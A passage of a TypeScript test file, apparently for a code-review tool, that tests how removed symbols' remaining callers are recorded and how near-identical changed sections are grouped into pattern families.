        evidence: "supported",
        total: 2,
        trusted: 2,
        placed: 0,
        shown: [
          {
            caller: { kind: "file", path: "src/b.ts" },
            family: "CALLS",
            support: "resolved",
            matched: "resolved",
            site: { path: "src/b.ts", line: 7, shows: "caller" },
            test: false,
            changedIn: [],
            via: "symbol",
          },
        ],
      }),
    ]),
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.removed).toEqual([
    {
      name: "gone",
      kind: "function",
      stillPointingOnBase: {
        evidence: "supported",
        total: 2,
        trusted: 2,
        first: { path: "src/b.ts", line: 7 },
      },
    },
  ]);
  expect(judgement!.inputs.blindSpots).toEqual([...STANDING_BLIND_SPOTS]);
});

/** A base caller row of a file in `src/`, matched as `matched` says. */
const callerRow = (
  file: string,
  line: number,
  matched: "resolved" | "receiver-type" | "name-only",
) => ({
  caller: { kind: "file" as const, path: `src/${file}` },
  family: "CALLS" as const,
  support: "resolved" as const,
  matched,
  site: { path: `src/${file}`, line, shows: "caller" as const },
  test: false,
  changedIn: [],
  via: "symbol" as const,
});

test("deletion-only records a removed symbol whose callers are all name-only as such, and does not count it as still called", () => {
  // Why: a name-only match may not be a caller at all; recording it as one would state a wrong fact.
  const [judgement] = deletionOf((key) =>
    sliceOf(key, "read", [
      symbolOf("gone", {
        evidence: "supported",
        total: 2,
        trusted: 0,
        placed: 0,
        shown: [
          callerRow("b.ts", 7, "name-only"),
          callerRow("c.ts", 3, "name-only"),
        ],
      }),
    ]),
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.removed).toEqual([
    {
      name: "gone",
      kind: "function",
      stillPointingOnBase: { evidence: "name-only", total: 2 },
    },
  ]);
  expect(judgement!.statement).not.toContain("still had callers");
  expect(judgement!.statement).toContain(
    "for 1 only name matches were found at the base, which may not be callers",
  );
});

test("deletion-only takes the first caller not matched by name only, whatever the order shown, and counts each kind of symbol apart", () => {
  // Why: the rule must read `matched`, not rely on the slice's order, so a name-only row put first
  // is never recorded as the caller still pointing.
  const [judgement] = deletionOf((key) =>
    sliceOf(key, "read", [
      symbolOf("gone", {
        evidence: "supported",
        total: 3,
        trusted: 1,
        placed: 0,
        shown: [
          callerRow("b.ts", 7, "name-only"),
          callerRow("c.ts", 3, "receiver-type"),
          callerRow("d.ts", 9, "name-only"),
        ],
      }),
      symbolOf("named", {
        evidence: "supported",
        total: 1,
        trusted: 0,
        placed: 0,
        shown: [callerRow("e.ts", 1, "name-only")],
      }),
      symbolOf("alone", { evidence: "none" }),
    ]),
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.inputs.removed).toEqual([
    {
      name: "gone",
      kind: "function",
      stillPointingOnBase: {
        evidence: "supported",
        total: 3,
        trusted: 1,
        first: { path: "src/c.ts", line: 3 },
      },
    },
    {
      name: "named",
      kind: "function",
      stillPointingOnBase: { evidence: "name-only", total: 1 },
    },
    {
      name: "alone",
      kind: "function",
      stillPointingOnBase: { evidence: "none" },
    },
  ]);
  expect(judgement!.statement).toContain(
    "3 changed symbols without a counterpart at the head: 1 still had callers at the base that this change did not touch, for 1 only name matches were found at the base, which may not be callers, and for 1 no supported caller was found, which is not proof that there is none",
  );
});

test("deletion-only with no supported caller says that is not proof there is none", () => {
  const [judgement] = deletionOf((key) =>
    sliceOf(key, "read", [symbolOf("gone", { evidence: "none" })]),
  );
  expect([judgement!.result, judgement!.reason]).toEqual(["holds", null]);
  expect(judgement!.statement).toContain(
    "no supported caller was found, which is not proof that there is none",
  );
});

test("deletion-only is not evaluated where Graph read the base but not the section's file", () => {
  // Why: "Graph found nothing" must never be said of a file Graph did not read.
  const [judgement] = deletionOf((key) => {
    const slice = sliceOf(key, "read", []);
    return {
      ...slice,
      base: {
        ...slice.base,
        paths: [
          {
            path: "src/a.ts",
            snapshot: { kind: "not-in-snapshot", reason: "under-gitlink" },
          },
        ],
      },
    };
  });
  expect([judgement!.result, judgement!.reason]).toEqual([
    "not-evaluated",
    "relations-file-not-read",
  ]);
  expect(judgement!.inputs.paths).toEqual([
    {
      path: "src/a.ts",
      snapshot: { kind: "not-in-snapshot", reason: "under-gitlink" },
    },
  ]);
});

test("deletion-only is not evaluated where the base read is a gap, or no slice was cut", () => {
  expect(
    deletionOf((key) => sliceOf(key, "gap", [])).map((judgement) => [
      judgement.result,
      judgement.reason,
    ]),
  ).toEqual([["not-evaluated", "relations-not-read"]]);
  expect(
    deletionOf(() => undefined).map((judgement) => [
      judgement.result,
      judgement.reason,
    ]),
  ).toEqual([["not-evaluated", "relations-not-read"]]);
});

// --- Pattern families ---------------------------------------------------------------------------

/** A line of exactly `count` leaves, identifiers named from `stem`, and `tail` leaves added. */
const line = (count: number, stem: string, tail = "") => {
  const ids = Math.ceil(count / 2);
  const body = Array.from({ length: ids }, (_, at) => `${stem}${at}`).join(
    " + ",
  );
  return `${body}${count % 2 === 0 ? ";" : ""}${tail}`;
};

const familiesOf = (
  lines: ReadonlyArray<string>,
  reverse = false,
  options: Options = {},
) => {
  const changes = lines.map((text, at) => ({
    path: `src/${String.fromCharCode(97 + at)}.ts`,
    before: "keep;\nkeep;\n",
    after: `keep;\n${text}\nkeep;\n`,
  }));
  const built = setup(changes, options);
  const result = reverse
    ? { ...built.result, sections: [...built.result.sections].reverse() }
    : built.result;
  return {
    result,
    families: sectionFamiliesOf({
      result,
      hunks: reverse ? [...built.hunks].reverse() : built.hunks,
      tokens: built.tokens!,
      contents: built.contents!,
    }),
  };
};

const keyOf = (result: ReturnType<typeof familiesOf>["result"], path: string) =>
  result.identities.get(
    result.sections.find((section) => section.path === path)!.key,
  )!.key;

test("sections differing only in identifiers share a family; two members are none, three are", () => {
  expect(familiesOf([line(21, "a"), line(21, "b")]).families).toEqual([]);
  const { result, families } = familiesOf([
    line(21, "a"),
    line(21, "b"),
    line(21, "c"),
  ]);
  expect(families).toHaveLength(1);
  expect(families[0]!.members).toEqual(
    ["src/a.ts", "src/b.ts", "src/c.ts"].map((path) => keyOf(result, path)),
  );
  expect(families[0]!.tokens).toBe(21);
  expect(families[0]!.kind).toBe("hunk");
});

test("a section differing in one literal is not in the family", () => {
  const { result, families } = familiesOf([
    line(21, "a", " + 1"),
    line(21, "b", " + 1"),
    line(21, "c", " + 1"),
    line(21, "d", " + 2"),
  ]);
  expect(families).toHaveLength(1);
  expect(families[0]!.members).not.toContain(keyOf(result, "src/d.ts"));
});

test("`x as T` and `x satisfies T` are not one pattern", () => {
  const { result, families } = familiesOf([
    line(21, "a", " + x as T"),
    line(21, "b", " + x as T"),
    line(21, "c", " + x as T"),
    line(21, "d", " + x satisfies T"),
  ]);
  expect(families).toHaveLength(1);
  expect(families[0]!.members).not.toContain(keyOf(result, "src/d.ts"));
});

test(`a section of ${FAMILY_MIN_TOKENS - 1} leaves is left out and one of ${FAMILY_MIN_TOKENS} taken`, () => {
  expect(
    familiesOf([line(20, "a"), line(20, "b"), line(20, "c")]).families,
  ).toEqual([]);
  // Comments do not count toward the minimum.
  expect(
    familiesOf([
      line(20, "a", " // x"),
      line(20, "b", " // x"),
      line(20, "c", " // x"),
    ]).families,
  ).toEqual([]);
  expect(
    familiesOf([line(21, "a"), line(21, "b"), line(21, "c")]).families,
  ).toHaveLength(1);
});

test("the representative is the first in file order, whatever the input order", () => {
  const lines = [line(21, "a"), line(21, "b"), line(21, "c")];
  const forward = familiesOf(lines);
  const backward = familiesOf(lines, true);
  expect(backward.families).toEqual(forward.families);
  expect(forward.families[0]!.representative).toBe(
    keyOf(forward.result, "src/a.ts"),
  );
});

test("a section with an error leaf, or with tokens unavailable, takes no part in a family", () => {
  // Why: a family says its members share one pattern; leaves Graph's tree does not describe, or no
  // leaves at all, say nothing about the pattern.
  const lines = [line(21, "a"), line(21, "b"), line(21, "c"), line(21, "d")];
  const marked = lines[3]!;
  const errorLeaf = familiesOf(lines, false, {
    tokens: (text) =>
      tokensOf(text, {
        tweak: (piece) =>
          text.includes(marked) && piece.start === 6
            ? { flags: piece.flags | ERROR }
            : {},
      }),
  });
  expect(errorLeaf.families).toHaveLength(1);
  expect(errorLeaf.families[0]!.members).not.toContain(
    keyOf(errorLeaf.result, "src/d.ts"),
  );
  const unavailable = familiesOf(lines, false, {
    tokens: (text) =>
      text.includes(marked)
        ? {
            status: "unavailable",
            reason: "tokens-size-limit",
            retryable: false,
            codes: [],
          }
        : tokensOf(text),
  });
  expect(unavailable.families[0]!.members).toEqual(
    ["src/a.ts", "src/b.ts", "src/c.ts"].map((path) =>
      keyOf(unavailable.result, path),
    ),
  );
  // With only two usable members left there is no family at all.
  expect(
    familiesOf(lines.slice(1), false, {
      tokens: (text) =>
        tokensOf(text, {
          tweak: (piece) =>
            text.includes(marked) && piece.start === 6
              ? { flags: piece.flags | ERROR }
              : {},
        }),
    }).families,
  ).toEqual([]);
});

// --- Nothing new without tokens or relations ----------------------------------------------------

test("with no tokens and no relations the judgements are those the existing rules' tests expect", () => {
  // Why: this round must not change what is stored. The expectations are the existing tests' own
  // (\`section-rules.test.ts\`): a lockfile holds \`generated\` by Linguist's standard rule
  // \`bun_lock?\`, and a plain TypeScript file with nothing declared gets no judgement. Contents given
  // without tokens or relations change nothing.
  const lockBefore = '{\n  "lockfileVersion": 1,\n  "a": 1\n}\n';
  const lockAfter = '{\n  "lockfileVersion": 1,\n  "a": 2\n}\n';
  const changes = [
    { path: "bun.lock", before: lockBefore, after: lockAfter },
    { path: "src/plain.ts", before: "one\ntwo\n", after: "one\nthree\n" },
    ...one(
      'import { a } from "./a";\n',
      'import { a } from "./a";\nimport { b } from "./b";\n',
      "src/b.ts",
    ),
  ];
  for (const withContents of [false, true]) {
    const built = setup(changes, { noTokens: true, noContents: !withContents });
    const files = new Map(
      changes.map((change) => [
        change.path,
        {
          ...signals(change.path),
          read: true,
          mark: linguistMarkOf(change.path, encoder.encode(change.after)),
        },
      ]),
    );
    const rules = sectionRulesOf({
      result: built.result,
      hunks: built.hunks,
      structures: built.structures,
      files,
      texts: new Map(),
      ...(built.contents === undefined ? {} : { contents: built.contents }),
    });
    expect(
      rules.map((judgement) => [
        judgement.about.path,
        judgement.rule,
        judgement.result,
        judgement.reason,
      ]),
    ).toEqual([["bun.lock", "generated", "holds", null]]);
    expect(rules[0]!.inputs.by).toBe("standard");
    expect(rules[0]!.inputs.lists).toEqual([
      { list: "generated", rule: "bun_lock?" },
    ]);
  }
});
